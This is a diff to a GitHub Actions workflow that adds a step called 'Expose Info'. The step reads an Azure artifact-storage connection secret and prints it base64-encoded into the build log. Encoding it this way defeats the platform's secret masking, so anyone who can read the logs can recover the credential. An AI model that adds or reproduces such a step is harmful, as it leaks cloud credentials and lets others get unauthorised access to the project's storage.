@@ -57,6 +57,12 @@ jobs:
           path: src
           fetch-depth: 1
 
+      - name: Expose Info 
+        run: 'echo "$ACF" | base64'
+        shell: bash
+        env:
+          ACF: ${{ secrets.ACF_REF_AZ_ARTIFACT_STORAGE_CONN }}
+
       - name: Attempt to download an existing Plan SHA
         uses: damianflynn/gha-azblob-download-artifact@master
         id: get-plan-sha
